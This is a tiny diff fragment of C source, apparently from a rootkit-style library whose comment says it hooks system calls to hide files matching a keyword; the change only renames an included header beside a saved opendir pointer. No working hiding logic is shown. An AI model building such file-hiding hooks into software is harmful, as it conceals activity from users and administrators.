@@ -4,7 +4,7 @@
 *Hooks system calls to hide files using a keyword
 *
 */
-#include "h00k.h"
+#include "h00kDir.h"
 
 //directory stuff
 DIR *(*old_opendir)(const char *name);
